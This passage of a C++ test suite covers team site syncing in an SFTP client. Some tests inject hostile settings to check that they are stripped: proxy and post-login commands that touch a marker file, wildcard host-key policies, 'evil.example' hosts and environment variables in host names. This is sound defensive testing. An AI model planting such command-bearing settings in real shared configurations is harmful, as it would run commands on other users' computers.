    "[Sessions\\policy2]\nHostName=ok3.example\nSshHostKey= ACCEPTNEW \n"
    "[Configuration\\Interface]\nSomething=1\n").arg(Marker).toUtf8();
  Srv->PeerPush(J.Owner, J.Uuid, Evil);
  Received = 0;
  CHECK(SyncAll());
  auto Db = Site(J.Folder + QStringLiteral("/db"));
  CHECK(Db != nullptr);
  CHECK(Received == 1);
  CHECK(Db->HostName == QStringLiteral("127.0.0.1"));
  CHECK(Db->ProxyMethod == pmNone);
  CHECK(Db->ProxyTelnetCommand == SessionData().ProxyTelnetCommand);
  CHECK(Db->ProxyHost == SessionData().ProxyHost);
  CHECK(SecureShell::ProxyCommandOption(*Db).isEmpty());
  CHECK(Db->HostKey.isEmpty());
  CHECK(!Db->AgentFwd);
  CHECK(Db->TryAgent == SessionData().TryAgent);
  CHECK(Db->PostLoginCommands.isEmpty());
  CHECK(Db->Shell.isEmpty());
  CHECK(Db->SftpServer.isEmpty());
  CHECK(!Db->Tunnel);
  CHECK(Db->TunnelHostName.isEmpty());
  CHECK(Db->PortForwards.isEmpty());
  CHECK(Db->KnownHostsFile.isEmpty());
  CHECK(Db->LogicalHostName.isEmpty());
  CHECK(Db->PublicKeyFile.isEmpty());
  CHECK(Db->AgentAccess == 0);
  CHECK(Db->AgentAllow.isEmpty());
  CHECK(Db->ListingCommand == SessionData().ListingCommand);
  CHECK(!Db->IsWorkspace);
  // the stored form carries none of it either, unknown keys included
  IniFile Stored;
  Sites().Save(Stored);
  QByteArray Text = Stored.SaveToData();
  CHECK(!Text.contains("touch"));
  CHECK(!Text.contains("SomethingNewNobodyKnows"));
  // an environment variable in a host or user name would go to the admin's server
  CHECK(Site(J.Folder + QStringLiteral("/env")) == nullptr);
  CHECK(Site(J.Folder + QStringLiteral("/dash")) == nullptr);
  auto Env2 = Site(J.Folder + QStringLiteral("/env2"));
  CHECK((Env2 != nullptr) && Env2->UserName.isEmpty());
  // an exact host key may stay
  auto Exact = Site(J.Folder + QStringLiteral("/exact"));
  CHECK((Exact != nullptr) && Exact->HostKey.startsWith(QStringLiteral("ssh-ed25519")));
  // a host key policy is not a fingerprint, in any spelling
  CHECK(Site(J.Folder + QStringLiteral("/policy"))->HostKey.isEmpty());
  CHECK(Site(J.Folder + QStringLiteral("/policy2"))->HostKey.isEmpty());
  // the real CLI opens the stored site: no command runs
  QByteArray Cli = qgetenv("NIXSCP_TEST_CLI");
  if (!Cli.isEmpty())
  {
    QString Ini = Dir + QStringLiteral("/plain.ini");
    IniFile Plain;
    Sites().Save(Plain);
    CHECK(Plain.Save(Ini));
    QProcess Process;
    Process.start(QString::fromLocal8Bit(Cli), {QStringLiteral("/ini=") + Ini, QStringLiteral("/command"),
      QStringLiteral("option batch on"), QStringLiteral("open \"%1/db\"").arg(J.Folder), QStringLiteral("exit")});
    Process.waitForFinished(30000);
    CHECK(!QFile::exists(Marker));
  }
}

static void ScenarioPushAllowList()
{
  Boot();
  Setup S = OwnedTeam();
  // an owner's own dangerous settings stay on the owner's computer
  auto Db = Site(S.Folder + QStringLiteral("/db"));
  Db->ProxyMethod = pmCmd;
  Db->ProxyLocalCommand = QStringLiteral("touch /tmp/never");
  Db->PostLoginCommands = QStringLiteral("touch /tmp/never");
  Db->PublicKeyFile = QStringLiteral("/home/me/.ssh/id_ed25519");
  Db->HostKey = QStringLiteral("*");
  Configuration::Instance().Save();
  int Puts = Srv->Puts;
  CHECK(SyncAll());
  CHECK(Srv->Puts == Puts);   // nothing shared changed, nothing to push
  Db->RemoteDirectory = QStringLiteral("/srv/www");
  Configuration::Instance().Save();
  CHECK(SyncAll());
  CHECK(Srv->Puts == Puts + 1);
  QByteArray Plain;
  CHECK(TeamCrypto::DecodeSnapshot(Srv->LastPut, S.Key, Plain));
  CHECK(Plain.contains("RemoteDirectory"));
  CHECK(!Plain.contains("touch"));
  CHECK(!Plain.contains("id_ed25519"));
  CHECK(!Plain.contains("ProxyMethod"));
  CHECK(!Plain.contains("SshHostKey"));
  // the local settings survive the sync
  CHECK(Site(S.Folder + QStringLiteral("/db"))->ProxyMethod == pmCmd);
  // the upload sends what its URL was signed with
  CHECK(Srv->LastHeaders.toLower().contains("if-none-match: *"));
}

// Everything that matters of the allow-list shows up as a change
static void ScenarioChangeNotice()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  auto Changed = [&](const QByteArray & Extra)
  {
    QByteArray Text = Content(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}}) + Extra;
    Srv->PeerPush(J.Owner, J.Uuid, Text);
    Counts.clear();
    CHECK(SyncAll());
    CHECK((Counts.size() == 1) && (Counts.value(0).value(2) == 1));
  };
  Changed("RemoteDirectory=/x\n");
  Changed("RemoteDirectory=/x\nFtps=3\n");
  Changed("Note=hello\n");
  Notices.clear();
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), {{"db", "evil.example", "pw1"}}));
  CHECK(SyncAll());
  CHECK(Notices.join(QLatin1Char('\n')).contains(QStringLiteral("evil.example")));
}

//---------------------------------------------------------------------------
// Sync correctness

// B1: nothing changes, nothing is uploaded, nobody is told anything
static void ScenarioNoChurn()
{
  Boot();
  Setup S = OwnedTeam();
  int Puts = Srv->Puts;
  qint64 Head = Srv->Teams[S.Uuid].Head;
  Notices.clear();
  QByteArray Before = Teams().LocalContent(*Teams().Find(S.Uuid));
  for (int I = 0; I < 5; I++)
  {
    CHECK(SyncAll());
    Configuration::Instance().Save();
    Configuration::Instance().Load();
  }
  CHECK(Srv->Puts == Puts);
  CHECK(Srv->Teams[S.Uuid].Head == Head);
  CHECK(Notices.isEmpty());
  CHECK(Before == Teams().LocalContent(*Teams().Find(S.Uuid)));
  CHECK(Before.contains("PasswordPlain"));
}

static void ScenarioMemberNoChurn()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  Notices.clear();
  Received = 0;
  Srv->Log.clear();
  for (int I = 0; I < 4; I++)
  {
    CHECK(SyncAll());
    Configuration::Instance().Save();
    Configuration::Instance().Load();
  }
  CHECK(Notices.isEmpty());
  CHECK(Received == 0);
  CHECK(!Srv->Log.join(QLatin1Char('\n')).contains(QStringLiteral("download-url")));
  // a failed download is a failure, not a verification problem
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}, {"more", "more.internal", "pw2"}}));
  Srv->FailStatus.insert(QStringLiteral("/blob/"), 503);
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK_MSG(!Error.contains(QStringLiteral("verification")), Error);
  CHECK(Notices.isEmpty());
  CHECK(Teams().Find(J.Uuid)->Error.isEmpty());
  Srv->FailStatus.clear();
  CHECK(SyncAll());
  CHECK(Site(J.Folder + QStringLiteral("/more")) != nullptr);
  Notices.clear();
  // a real change by the member is reverted, and said once
  Site(J.Folder + QStringLiteral("/db"))->HostName = QStringLiteral("changed.example");
  Configuration::Instance().Save();
  CHECK(SyncAll());
  CHECK(Site(J.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db.internal"));
  CHECK((Notices.size() == 1) && Notices.first().contains(QStringLiteral("reverted")));
  // a site the member added does not vanish with it
  AddSite(J.Folder + QStringLiteral("/mine"), QStringLiteral("mine.internal"));
  CHECK(SyncAll());
  CHECK(Site(J.Folder + QStringLiteral("/mine")) == nullptr);
  CHECK((Site(QStringLiteral("mine")) != nullptr) && (Site(QStringLiteral("mine"))->HostName == QStringLiteral("mine.internal")));
  // agent access stays this person's own
  Site(J.Folder + QStringLiteral("/db"))->AgentAccess = 1;
  Configuration::Instance().Save();
  CHECK(SyncAll());
  CHECK(Site(J.Folder + QStringLiteral("/db"))->AgentAccess == 1);
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), {{"db", "db2.internal", "pw1"}}));
  CHECK(SyncAll());
  CHECK(Site(J.Folder + QStringLiteral("/db"))->AgentAccess == 1);
  CHECK(Site(J.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db2.internal"));
}

// T3: the rotation re-encrypts the head, not what this computer has
static void ScenarioRotateHead()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  // the head moved past this computer, and a member left
  Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "db.internal", "S3cret-password"}, {"newer", "newer.internal", "pw"}}));
  Peer Carol = NewPeer(QStringLiteral("carol"));
  Srv->PeerJoin(Carol, Srv->PeerInvite(S.Bob, S.Uuid, QStringLiteral("member"), QStringLiteral("Prod")));
  Srv->PeerRemove(S.Bob, S.Uuid, Carol.Uuid);
  qint64 Head = T.Head;
  CHECK(SyncAll());
  CHECK(T.Roster.KeyVersion == 2);
  CHECK(T.Head == Head + 1);
  QString Name;
  QStringList List;
  QByteArray NewKey = Teams().Find(S.Uuid)->Key.Copy();
  CHECK(NewKey != S.Key);
  CHECK(Read(T.Snapshots.value(T.Head), NewKey, Name, List));
  CHECK(List == QStringList({QStringLiteral("db"), QStringLiteral("newer")}));
  CHECK(Site(S.Folder + QStringLiteral("/newer")) != nullptr);
  CHECK(TeamCrypto::UnwrapForMember(S.Bob.Box, T.Wraps.value(S.Bob.Uuid), S.Uuid, 2) == NewKey);
}

// T3 on a computer with nothing: a new admin device must not push its emptiness
static void ScenarioRotateLocalEdit()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  // an unpushed local edit when a removal comes in: the key is renewed with the
  // head's content, and the edit goes up afterwards on top of it
  Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory = QStringLiteral("/edited");
  Configuration::Instance().Save();
  CHECK(Wait([&](const auto & D) { Teams().RemoveMember(S.Uuid, S.Bob.Uuid, D); }));
  CHECK(T.Roster.KeyVersion == 2);
  QByteArray Plain;
  CHECK(TeamCrypto::DecodeSnapshot(T.Snapshots.value(T.Head), Teams().Find(S.Uuid)->Key.Copy(), Plain));
  CHECK(Plain.contains("/edited"));
  CHECK(Teams().Find(S.Uuid)->Conflict.isEmpty());
  QByteArray Rotated;
  CHECK(TeamCrypto::DecodeSnapshot(T.Snapshots.value(T.Head - 1), Teams().Find(S.Uuid)->Key.Copy(), Rotated));
  CHECK(!Rotated.contains("/edited"));
}

// T4: rotate and re-push are one step: a failure leaves nothing half done
static void ScenarioRotateFails()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  qint64 Head = T.Head;
  // the upload of the new snapshot fails, then the rotate call
  Srv->FailStatus.insert(QStringLiteral("/sync/upload-url"), 500);
  Srv->FailCount.insert(QStringLiteral("/sync/upload-url"), 1);
  QString Error;
  CHECK(!Wait([&](const auto & D) { Teams().RemoveMember(S.Uuid, S.Bob.Uuid, D); }, &Error));
  CHECK(T.Roster.KeyVersion == 1);
  CHECK(T.Head == Head);
  CHECK(Teams().Find(S.Uuid)->NeedsRotation);
  Srv->FailStatus.clear();
  Srv->FailCount.clear();
  Srv->FailStatus.insert(QStringLiteral("/rotate"), 503);
  Srv->FailCount.insert(QStringLiteral("/rotate"), 1);
  CHECK(!SyncAll(&Error));
  CHECK(T.Roster.KeyVersion == 1);
  CHECK(T.Head == Head);
  // the next sync finishes the job from the signed removal alone
  Srv->FailStatus.clear();
  Srv->FailCount.clear();
  CHECK(SyncAll(&Error));
  CHECK(T.Roster.KeyVersion == 2);
  CHECK(T.Head == Head + 1);
  CHECK(!Teams().Find(S.Uuid)->NeedsRotation);
}

// F-13, scenario I: an admin without the key rotates nothing and pushes nothing
static void ScenarioNoKeyAdmin()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}}, QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[J.Uuid];
  T.ServeWrap = QByteArray(92, '\1');
  Peer Carol = NewPeer(QStringLiteral("carol"));
  Srv->PeerJoin(Carol, Srv->PeerInvite(J.Owner, J.Uuid, QStringLiteral("member"), QStringLiteral("Shared")));
  Srv->PeerRemove(J.Owner, J.Uuid, Carol.Uuid);
  qint64 Head = T.Head;
  int Puts = Srv->Puts;
  CHECK(!SyncAll());
  CHECK(T.Head == Head);
  CHECK(T.Roster.KeyVersion == 1);
  CHECK(Srv->Puts == Puts);
  CHECK(Site(J.Folder + QStringLiteral("/db")) != nullptr);
}

// T6: the personal copy goes only after the commit succeeded
static void ScenarioMoveCommits()
{
  Boot();
  Setup S = OwnedTeam();
  AddSite(QStringLiteral("Temp/gone"), QStringLiteral("gone.internal"), QStringLiteral("gone-pw"));
  Srv->FailStatus.insert(QStringLiteral("/sync/commit"), 500);
  QString Error;
  CHECK(!Wait([&](const auto & D) { Teams().ShareSites(S.Uuid, {QStringLiteral("Temp/gone")}, QString(), true, D); }, &Error));
  CHECK(Site(QStringLiteral("Temp/gone")) != nullptr);
  CHECK(Site(S.Folder + QStringLiteral("/gone")) != nullptr);
  // a restart in between changes nothing: the plan is in the state file
  Teams().Initialize(Configuration::Instance(), CloudSync::Instance());
  Srv->FailStatus.clear();
  CHECK(SyncAll(&Error));
  CHECK(Site(QStringLiteral("Temp/gone")) == nullptr);
  CHECK(Site(S.Folder + QStringLiteral("/gone"))->Password == QStringLiteral("gone-pw"));
}

// T6, the other way: the head moved, the admin takes the team's version; the
// site is not in the team, so its personal copy stays
static void ScenarioMoveConflict()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  AddSite(QStringLiteral("Temp/gone"), QStringLiteral("gone.internal"), QStringLiteral("gone-pw"));
  // another admin was first
  Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "db.internal", "S3cret-password"}, {"theirs", "theirs.internal", "pw"}}));
  QString Error;
  CHECK(!Wait([&](const auto & D) { Teams().ShareSites(S.Uuid, {QStringLiteral("Temp/gone")}, QString(), true, D); }, &Error));
  CHECK(Site(QStringLiteral("Temp/gone")) != nullptr);
  CHECK(!Teams().Find(S.Uuid)->Conflict.isEmpty());
  CHECK(Wait([&](const auto & D) { Teams().ResolveConflict(S.Uuid, false, D); }, &Error));
  CHECK(Site(QStringLiteral("Temp/gone")) != nullptr);
  CHECK(Site(S.Folder + QStringLiteral("/theirs")) != nullptr);
  CHECK(Site(S.Folder + QStringLiteral("/gone")) == nullptr);
}

// T7: only the server's plain "no such team" or a verified removal ends a membership
static void ScenarioBadList()
{
  Boot();
  Setup S = OwnedTeam();
  Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory = QStringLiteral("/unpushed");
  Configuration::Instance().Save();
  Notices.clear();
  for (const QByteArray & Body : {QByteArray("<html>maintenance</html>"), QByteArray("{}"), QByteArray("[1,2,3]"), QByteArray("[{\"uuid\":\"x\"}]"), QByteArray("null")})
  {
    Srv->TeamsRaw = Body;
    Srv->Log.clear();
    QString Error;
    CHECK(!SyncAll(&Error));
    CHECK_MSG(Error.contains(QStringLiteral("not a list")), Error);
    CHECK(!Srv->Log.join(QLatin1Char('\n')).contains(QStringLiteral("/roster")));
    CHECK(Site(S.Folder + QStringLiteral("/db")) != nullptr);
    CHECK(Notices.isEmpty());
  }
  // a valid list without the team, but the team still answers: it stays
  Srv->TeamsRaw = "[]";
  CHECK(!SyncAll());
  CHECK(Site(S.Folder + QStringLiteral("/db")) != nullptr);
  // an error for the team is not a removal either
  Srv->FailStatus.insert(QStringLiteral("/roster"), 500);
  CHECK(!SyncAll());
  Srv->FailStatus.insert(QStringLiteral("/roster"), 404);   // "injected", not not_found
  CHECK(!SyncAll());
  CHECK(Site(S.Folder + QStringLiteral("/db")) != nullptr);
  CHECK(Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory == QStringLiteral("/unpushed"));
  Srv->FailStatus.clear();
  Srv->TeamsRaw.clear();
  CHECK(SyncAll());
  // the edit went up after all
  QByteArray Plain;
  FakeTeam & T = Srv->Teams[S.Uuid];
  CHECK(TeamCrypto::DecodeSnapshot(T.Snapshots.value(T.Head), S.Key, Plain));
  CHECK(Plain.contains("/unpushed"));
}

static void ScenarioRemoved()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  Srv->PeerRemove(J.Owner, J.Uuid, VictimUuid);
  Notices.clear();
  CHECK(SyncAll());
  CHECK(Teams().Find(J.Uuid) == nullptr);
  CHECK(Site(J.Folder + QStringLiteral("/db")) == nullptr);
  CHECK(Notices.join(QLatin1Char('\n')).contains(QStringLiteral("no longer a member")));
  // said once: what stays of the team is a floor, not a team to check every minute
  Notices.clear();
  Srv->Log.clear();
  CHECK(SyncAll());
  CHECK(Notices.isEmpty());
  CHECK(!Srv->Log.join(QLatin1Char('\n')).contains(QStringLiteral("/roster")));
}

// A team that is gone: what was never shared stays, with the person
static void ScenarioGoneKeepsEdits()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}, {"web", "web.internal", "pw2"}}, QStringLiteral("admin"));
  Srv->FailStatus.insert(QStringLiteral("/sync/"), 500);
  Site(J.Folder + QStringLiteral("/db"))->RemoteDirectory = QStringLiteral("/unpushed");
  Configuration::Instance().Save();
  AddSite(J.Folder + QStringLiteral("/added"), QStringLiteral("added.internal"));
  CHECK(!SyncAll());
  Srv->FailStatus.clear();
  Srv->Teams.remove(J.Uuid);
  Notices.clear();
  CHECK(SyncAll());
  CHECK(Teams().Find(J.Uuid) == nullptr);
  CHECK(Site(J.Folder + QStringLiteral("/db")) == nullptr);
  CHECK(Site(J.Folder + QStringLiteral("/web")) == nullptr);
  CHECK((Site(QStringLiteral("db")) != nullptr) && (Site(QStringLiteral("db"))->RemoteDirectory == QStringLiteral("/unpushed")));
  CHECK(Site(QStringLiteral("added")) != nullptr);
  CHECK(Site(QStringLiteral("web")) == nullptr);
  CHECK(Notices.join(QLatin1Char('\n')).contains(QStringLiteral("no longer a member")));
}

// T8: a failure reaches the caller
static void ScenarioErrors()
{
  Boot();
  Setup S = OwnedTeam();
  AddSite(S.Folder + QStringLiteral("/new"), QStringLiteral("new.internal"));
  QString Error;
  Srv->FailStatus.insert(QStringLiteral("/sync/commit"), 500);
  CHECK(!SyncAll(&Error));
  CHECK(!Error.isEmpty());
  CHECK(!Teams().LastError().isEmpty());
  Srv->FailStatus.clear();
  Srv->FailStatus.insert(QStringLiteral("/blob/"), 500);
  CHECK(!SyncAll(&Error));
  Srv->FailStatus.clear();
  Srv->FailStatus.insert(QStringLiteral("/sync/upload-url"), 500);
  CHECK(!Wait([&](const auto & D) { Teams().ShareFolder(S.Uuid, QStringLiteral("Nothing"), D); }, &Error));
  CHECK(!SyncAll(&Error));
  Srv->FailStatus.clear();
  // one failing team does not stop the others, and the failure is still reported
  QString Other = CreateTeam(QStringLiteral("Other"));
  AddSite(FolderOf(Other) + QStringLiteral("/x"), QStringLiteral("x.internal"));
  CHECK(SyncAll());
  AddSite(FolderOf(Other) + QStringLiteral("/y"), QStringLiteral("y.internal"));
  Srv->Teams[S.Uuid].ServeHead = 0;
  qint64 Head = Srv->Teams[Other].Head;
  CHECK(!SyncAll(&Error));
  CHECK(Srv->Teams[Other].Head == Head + 1);
  // and an operation on the good team answers for that team only
  AddSite(QStringLiteral("Solo"), QStringLiteral("solo.internal"));
  CHECK(Wait([&](const auto & D) { Teams().ShareSites(Other, {QStringLiteral("Solo")}, QString(), false, D); }, &Error));
}

// T9: both changed: the local edit stays, the admin is told and decides
static void ScenarioConflict()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  auto Edit = [&](const QString & Dir) { Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory = Dir; Configuration::Instance().Save(); };
  Edit(QStringLiteral("/mine"));
  Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "theirs.internal", "pw"}}));
  qint64 Head = T.Head;
  int Puts = Srv->Puts;
  Notices.clear();
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK(!Teams().Find(S.Uuid)->Conflict.isEmpty());
  CHECK(Notices.size() == 1);
  CHECK(Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory == QStringLiteral("/mine"));
  CHECK(T.Head == Head);
  CHECK(Srv->Puts == Puts);
  // told once, not every minute, and without downloading again
  Srv->Log.clear();
  CHECK(!SyncAll(&Error));
  CHECK(Notices.size() == 1);
  CHECK(!Teams().Find(S.Uuid)->Conflict.isEmpty());
  CHECK(!Srv->Log.join(QLatin1Char('\n')).contains(QStringLiteral("download-url")));
  // keep mine: it goes on top of theirs, which the history keeps
  CHECK(Wait([&](const auto & D) { Teams().ResolveConflict(S.Uuid, true, D); }, &Error));
  CHECK(T.Head == Head + 1);
  CHECK(Teams().Find(S.Uuid)->Conflict.isEmpty());
  QByteArray Plain;
  CHECK(TeamCrypto::DecodeSnapshot(T.Snapshots.value(T.Head), S.Key, Plain));
  CHECK(Plain.contains("/mine"));
  // again, this time taking the team's version
  Edit(QStringLiteral("/mine2"));
  Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "theirs2.internal", "pw"}}));
  CHECK(!SyncAll(&Error));
  CHECK(Wait([&](const auto & D) { Teams().ResolveConflict(S.Uuid, false, D); }, &Error));
  CHECK(Site(S.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("theirs2.internal"));
  CHECK(Teams().Find(S.Uuid)->Conflict.isEmpty());
  // the same edit on both sides is no conflict
  Edit(QStringLiteral("/both"));
  IniFile Ini;
  TeamContent::AddSite(Ini, QStringLiteral("db"), *Site(S.Folder + QStringLiteral("/db")));
  Srv->PeerPush(S.Bob, S.Uuid, TeamContent::Encode(QStringLiteral("Prod"), Ini));
  Head = T.Head;
  CHECK(SyncAll(&Error));
  CHECK(T.Head == Head);
  CHECK(Teams().Find(S.Uuid)->Conflict.isEmpty());
}

// T9 at the commit: the head moves between upload and commit
static void ScenarioLateConflict()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory = QStringLiteral("/mine");
  Configuration::Instance().Save();
  Srv->OnRequest = [&](const QString & Request)
  {
    if (Request.contains(QStringLiteral("/sync/commit")))
    {
      Srv->OnRequest = nullptr;
      Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "theirs.internal", "pw"}}));
    }
  };
  Notices.clear();
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK(Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory == QStringLiteral("/mine"));
  CHECK(!Teams().Find(S.Uuid)->Conflict.isEmpty());
  CHECK(Notices.size() == 1);
}

// T17: a key version mismatch is not "another admin changed the sites"
static void ScenarioKeyMismatch()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  AddSite(S.Folder + QStringLiteral("/new"), QStringLiteral("new.internal"));
  Srv->OnRequest = [&](const QString & Request)
  {
    if (Request.contains(QStringLiteral("/sync/commit")))
    {
      Srv->OnRequest = nullptr;
      Srv->PeerRotate(S.Bob, S.Uuid);
      // without the head having moved: only the key
      T.Snapshots.remove(T.Head);
      T.Head--;
    }
  };
  Notices.clear();
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("key changed")), Error);
  CHECK(Notices.isEmpty());
  CHECK(Site(S.Folder + QStringLiteral("/new")) != nullptr);
}

// An empty team over a non-empty head needs an explicit action
static void ScenarioEmptyGuard()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  qint64 Head = T.Head;
  Sites().Remove(S.Folder + QStringLiteral("/db"));
  Configuration::Instance().Save();
  Notices.clear();
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK(T.Head == Head);
  CHECK(!Teams().Find(S.Uuid)->Conflict.isEmpty());
  CHECK(Notices.size() == 1);
  CHECK(!SyncAll(&Error));
  CHECK(Notices.size() == 1);
  // get them back
  CHECK(Wait([&](const auto & D) { Teams().ResolveConflict(S.Uuid, false, D); }, &Error));
  CHECK(Site(S.Folder + QStringLiteral("/db")) != nullptr);
  CHECK(T.Head == Head);
  // or remove them on purpose
  CHECK(Wait([&](const auto & D) { Teams().Unshare(S.Uuid, {QStringLiteral("db")}, true, D); }, &Error));
  CHECK(T.Head == Head + 1);
  CHECK(Site(QStringLiteral("db")) != nullptr);
  QString Name;
  QStringList List;
  CHECK(Read(T.Snapshots.value(T.Head), S.Key, Name, List));
  CHECK(List.isEmpty());
}

// B2: the history is there to get back from a bad version
static void ScenarioRestore()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  qint64 Good = T.Head;
  Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {}));
  CHECK(SyncAll());
  CHECK(Site(S.Folder + QStringLiteral("/db")) == nullptr);
  auto Versions = std::make_shared<QJsonArray>();
  auto Done = std::make_shared<int>(0);
  Teams().History(S.Uuid, [Versions, Done](bool Ok, const QString &, const QJsonArray & List) { *Versions = List; *Done = Ok ? 1 : 2; });
  Spin([Done]() { return *Done != 0; });
  CHECK((*Done == 1) && (Versions->size() == T.Head));
  QString Error;
  CHECK(Wait([&](const auto & D) { Teams().Restore(S.Uuid, Good, D); }, &Error));
  auto Db = Site(S.Folder + QStringLiteral("/db"));
  CHECK((Db != nullptr) && (Db->Password == QStringLiteral("S3cret-password")));
  CHECK(T.Head == Good + 2);
  QString Name;
  QStringList List;
  CHECK(Read(T.Snapshots.value(T.Head), S.Key, Name, List));
  CHECK(List == QStringList({QStringLiteral("db")}));
  // through a rotation: this computer keeps the old keys it had
  Peer Carol = NewPeer(QStringLiteral("carol"));
  Srv->PeerJoin(Carol, InviteCode(S.Uuid, QStringLiteral("member")));
  CHECK(Wait([&](const auto & D) { Teams().RemoveMember(S.Uuid, Carol.Uuid, D); }, &Error));
  CHECK(T.Roster.KeyVersion == 2);
  Srv->Teams[S.Uuid].Key = Teams().Find(S.Uuid)->Key.Copy();
  Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {}));
  CHECK(SyncAll());
  CHECK(Wait([&](const auto & D) { Teams().Restore(S.Uuid, Good, D); }, &Error));
  CHECK(Site(S.Folder + QStringLiteral("/db")) != nullptr);
  // a forged old version is refused
  T.Snapshots[1] = Srv->PeerSnapshot(NewPeer(QStringLiteral("eve")), T, 1, Content(QStringLiteral("Prod"), {{"db", "evil.example", "x"}}));
  CHECK(!Wait([&](const auto & D) { Teams().Restore(S.Uuid, 1, D); }, &Error));
  CHECK(Site(S.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db.internal"));
}

// T12: sharing onto a site of the same name keeps both
static void ScenarioShareCollision()
{
  Boot();
  Setup S = OwnedTeam();
  AddSite(QStringLiteral("Shared/db"), QStringLiteral("personal.internal"));
  AddSite(S.Folder + QStringLiteral("/Shared/db"), QStringLiteral("team.internal"));
  CHECK(SyncAll());
  QString Error;
  CHECK(Wait([&](const auto & D) { Teams().ShareFolder(S.Uuid, QStringLiteral("Shared"), D); }, &Error));
  CHECK(Site(S.Folder + QStringLiteral("/Shared/db"))->HostName == QStringLiteral("team.internal"));
  CHECK(Site(S.Folder + QStringLiteral("/Shared/db (1)"))->HostName == QStringLiteral("personal.internal"));
  CHECK(Site(QStringLiteral("Shared/db")) == nullptr);
}

// T14: another account signs in: no false removal, nothing lost
static void ScenarioAccountChange()
{
  Boot();
  Setup S = OwnedTeam();
  Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory = QStringLiteral("/unpushed");
  Configuration::Instance().Save();
  Srv->User = QStringLiteral("bbbbbbbb-0000-4000-8000-000000000002");
  Srv->Email = QStringLiteral("other@nixscp.test");
  Srv->SyncHead.clear();
  Srv->SyncObjects.clear();
  SignIn();
  MakeKey();
  Notices.clear();
  QString Error;
  CHECK(SyncAll(&Error));
  CHECK(Notices.isEmpty());
  CHECK(Site(S.Folder + QStringLiteral("/db")) != nullptr);
  CHECK(Teams().Find(S.Uuid) == nullptr);
  // the new account's team cannot land in the old folder
  QString Other = CreateTeam(QStringLiteral("Prod"));
  CHECK(FolderOf(Other) != S.Folder);
  // back to the first account: its state is still there (a new data key would be
  // another computer; here the key is the one of the session)
  CHECK(Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory == QStringLiteral("/unpushed"));
}

// T15: reading a team's sites is not quadratic
static void ScenarioManySites()
{
  Boot();
  QString Uuid = CreateTeam(QStringLiteral("Big"));
  QString Folder = FolderOf(Uuid);
  for (int I = 0; I < 4000; I++)
  {
    SessionData S;
    S.Name = Folder + QStringLiteral("/site%1").arg(I);
    S.HostName = QStringLiteral("h%1.example.com").arg(I);
    S.UserName = QStringLiteral("u");
    S.Password = QStringLiteral("pw%1").arg(I);
    Sites().Add(std::make_shared<SessionData>(S));
  }
  QElapsedTimer Timer;
  Timer.start();
  QByteArray Data = Teams().LocalContent(*Teams().Find(Uuid));
  qint64 Ms = Timer.elapsed();
  std::printf("  LocalContent of 4000 sites: %lld ms, %lld bytes\n", static_cast<long long>(Ms), static_cast<long long>(Data.size()));
  CHECK_MSG(Ms < 1500, QString::number(Ms));
  CHECK(Data.contains("site3999"));
  // and a push and a pull of them
  Timer.restart();
  CHECK(SyncAll());
